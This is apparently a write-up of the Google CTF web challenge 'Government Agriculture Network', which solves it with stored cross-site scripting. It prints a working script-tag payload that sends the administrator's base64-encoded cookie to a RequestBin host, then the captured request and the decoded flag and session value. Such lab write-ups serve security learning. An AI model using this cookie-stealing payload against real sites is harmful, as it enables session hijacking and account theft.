# Government Agriculture Network
Category: Web

## Description
> Well it seems someone can't keep their work life and their home life separate. You vaguely recall on your home planet, posters put up everywhere that said "Loose Zips sink large commercial properties with a responsibility to the shareholders." You wonder if there is a similar concept here.
> 
> Using the credentials to access this so-called Agricultural network, you realize that SarahH was just hired as a vendor or contract worker and given access that was equivalent. You can only assume that Vendor/Contractor is the highest possible rank bestowed upon only the most revered and well regarded individuals of the land and expect information and access to flow like the Xenovian acid streams you used to bathe in as a child.
> 
> The portal picture displays that small very attractive individual whom you instantly form a bond with, despite not knowing. You must meet this entity! Converse and convince them you're meant to be! After a brief amount of time the picture shifts into a biped presumably ingesting this creature! HOW DARE THEY. You have to save them, you have to stop this from happening. Get more information about this Gubberment thing and stop this atrocity.
> 
> You need to get in closer to save them - you beat on the window, but you need access to the cauliflower's  host to rescue it.
> 
> https://govagriculture.web.ctfcompetition.com/ 

## Solution

We visit the site and see the following content:

```html

    <nav class="navbar navbar-light bg-light">
      <span class="navbar-brand mb-0 h1">Ministry of Agriculture</span>
      <ul class="navbar-nav ml-auto">
        <li class="nav-item">
          <a class="nav-link" href="/admin">Admin</a>
        </li>
      </ul>
    </nav>

    <div class="container mt-3">
      
    <div class="row justify-content-center">
        <div class="col-9">
            <div class="news-create">
                <h2>Create a new post</h2>
                <form method="POST" action="/post">
                    <div class="form-group">
                        <textarea class="form-control" id="postContents" name="postContents" rows="10" placeholder="Enter your text here..."></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Submit</button>
                </form>
            </div>
            <div class="news-post">
                <h2 class="news-post-title">New acquisition on our farms</h2>
                <div class="news-post-date">May 15, 2019</div>
                <div class="news-post-content">
                    <div id="rescue-me">
                        <div class="mx-auto" width="500px">
                            <img src="/static/images/cauliflower.jpg" alt="Cauliflower" width="100%">
                        </div>
                        <div class="mx-auto mt-2" width="500px">
                            <img src="/static/images/eating.png" alt="People eating cauliflower" width="100%">
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    </div>
```

There's an "Admin" link, and a form to create a new post. "Admin" link redirects us back to the current page. What can we do with the form?

We start by testing out the form with a random input. The response from the form is ` Your post was submitted for review. Administator will take a look shortly. `. This is a hint towards XSS!

Our next attempt is:
```html
<script>image = new Image(); image.src='http://requestbin.fullcontact.com/1ejsfet1?e='+btoa(document.cookie);</script>
```

We will be using the [RequestBin](http://requestbin.fullcontact.com) service, which will log any activity to the URL we've provided and display it to us.

We are creating an image using Javascript, and setting the image source to the request bin, appending the user's cookie to the URI. When the user visits the website, the browser will attempt to load the image: It will take the base URL (the RequestBin URI), append to it the user cookie (base64 encoded), and use that as the image source. Since we have access to the server logs, we will be able to see the URI and extract the user cookie.

After a few seconds, we see such activity:

```
http://requestbin.fullcontact.com
GET /1ejsfet1?e=ZmxhZz1DVEZ7OGFhYTJmMzRiMzkyYjQxNTYwMTgwNGMyZjVmMGYyNGV9OyBzZXNzaW9uPUhXU3V3WDg3ODRDbWtRQzFWdjBCWEVUanlYTXROUXJW

0 bytes
17s ago
From 34.77.138.159, 104.155.55.51, 70.132.20.70
FORM/POST PARAMETERS
None
QUERYSTRING

e: ZmxhZz1DVEZ7OGFhYTJmMzRiMzkyYjQxNTYwMTgwNGMyZjVmMGYyNGV9OyBzZXNzaW9uPUhXU3V3WDg3ODRDbWtRQzFWdjBCWEVUanlYTXROUXJW
HEADERS

Cloudfront-Is-Desktop-Viewer: true
X-Amz-Cf-Id: ei8CZwl45u5YkdeE9xWEFLV1-OsWC6YL7Nd1yfDKVVXdy6qrPFfOUA==
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Total-Route-Time: 0
Pragma: no-cache
Accept-Encoding: gzip, deflate
Connect-Time: 1
Cache-Control: no-cache
Cloudfront-Is-Smarttv-Viewer: false
Host: requestbin.fullcontact.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36
Cloudfront-Is-Mobile-Viewer: false
X-Request-Id: e8d017c5-6058-454b-ae70-f012cc38cbbf
Cloudfront-Forwarded-Proto: http
Via: 1.1 infra-squid (squid/3.5.27), 1.1 58336461deb255b6ec24bb4f21db9b6b.cloudfront.net (CloudFront), 1.1 vegur
Connection: close
Cloudfront-Viewer-Country: US
Cloudfront-Is-Tablet-Viewer: false
```

We got the cookie, just need to decode it:
```console
root@kali:/media/sf_CTFs/google/Government_Agriculture_Network# echo ZmxhZz1DVEZ7OGFhYTJmMzRiMzkyYjQxNTYwMTgwNGMyZjVmMGYyNGV9OyBzZXNzaW9uPUhXU3V3WDg3ODRDbWtRQzFWdjBCWEVUanlYTXROUXJW | base64 -d
flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}; session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV
```